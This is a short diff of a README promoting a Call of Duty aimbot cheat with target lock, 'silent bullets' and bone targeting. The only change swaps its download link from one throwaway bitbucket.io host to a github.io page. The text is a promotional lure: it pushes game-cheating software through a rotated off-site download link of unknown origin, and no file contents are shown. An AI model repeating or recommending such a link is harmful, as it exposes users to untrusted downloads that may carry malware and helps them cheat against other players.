@@ -4,7 +4,7 @@
 
 In a game like **Call of Duty**, it’s not just who shoots first — it’s who hits first. And if you’re tired of getting clapped by slide-cancel sweatlords or wall-peeking campers, it’s time to switch on the **Aimbot**: a mod that delivers **instant target lock, silent bullets, bone targeting**, and **rage or legit aim assist** settings that make every match yours.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload3.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://Call-of-Duty-Aimbot-nu4.github.io/.github)
 ---
 
 ## 🎯 What Makes the CoD Aimbot So Powerful?
